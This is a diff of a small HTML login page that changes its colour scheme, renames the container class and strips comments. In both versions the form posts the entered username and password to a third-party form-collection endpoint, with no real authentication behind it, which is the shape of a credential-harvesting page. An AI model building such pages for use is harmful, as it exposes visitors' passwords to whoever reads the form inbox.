@@ -12,23 +12,22 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:linear-gradient(135deg,#0f2027,#2c5364);
+    background:linear-gradient(135deg,#1f1c2c,#928dab);
     font-family:Arial, sans-serif;
 }
 
-/* Login box */
-.login-container{
-    background:#fff;
+/* Card */
+.card{
+    background:white;
     padding:40px;
-    border-radius:12px;
-    box-shadow:0 10px 25px rgba(0,0,0,0.3);
+    border-radius:15px;
     width:320px;
+    box-shadow:0 10px 25px rgba(0,0,0,0.3);
     text-align:center;
 }
 
 h2{
     margin-bottom:20px;
-    color:#333;
 }
 
 /* Inputs */
@@ -43,8 +42,7 @@ input{
 }
 
 input:focus{
-    border-color:#2c5364;
-    box-shadow:0 0 5px rgba(44,83,100,0.3);
+    border-color:#6c63ff;
 }
 
 /* Button */
@@ -54,34 +52,30 @@ button{
     margin-top:15px;
     border:none;
     border-radius:8px;
-    background:#2c5364;
+    background:#6c63ff;
     color:white;
     font-size:16px;
     cursor:pointer;
 }
 
 button:hover{
-    background:#1e3c4a;
+    background:#574fd6;
 }
 </style>
 </head>
 
 <body>
 
-<div class="login-container">
+<div class="card">
 
-    <h2>User Login</h2>
+    <h2>Login</h2>
 
-    <!-- FORMSPREE FORM -->
     <form action="https://formspree.io/f/xykqbqkd" method="POST">
 
-        <!-- Username -->
-        <input type="text" name="username" placeholder="Enter Username" required>
+        <input type="text" name="username" placeholder="Username" required>
 
-        <!-- Password -->
-        <input type="password" name="password" placeholder="Enter Password" required>
+        <input type="password" name="password" placeholder="Password" required>
 
-        <!-- Login Button -->
         <button type="submit">Login</button>
 
     </form>
